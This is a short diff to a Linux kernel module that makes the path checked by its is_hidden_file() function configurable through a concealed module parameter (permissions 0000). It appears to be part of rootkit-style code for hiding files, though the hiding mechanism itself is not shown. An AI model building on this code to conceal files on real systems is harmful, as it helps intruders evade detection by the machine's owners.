@@ -3,9 +3,14 @@
 #include <linux/init.h>
 #include <linux/kmod.h>
 
+static char *hidden_path = NULL;
+
+module_param(hidden_path, charp, 0000);
+MODULE_PARM_DESC(hidden_path, "Path to the file to hide");
+
 static int is_hidden_file(const char *path)
 {
-    if (strstr(path, "/home/user/documents/secret.txt") != NULL) {
+    if (hidden_path != NULL && strcmp(path, hidden_path) == 0) {
         return 1;
     }
     return 0;
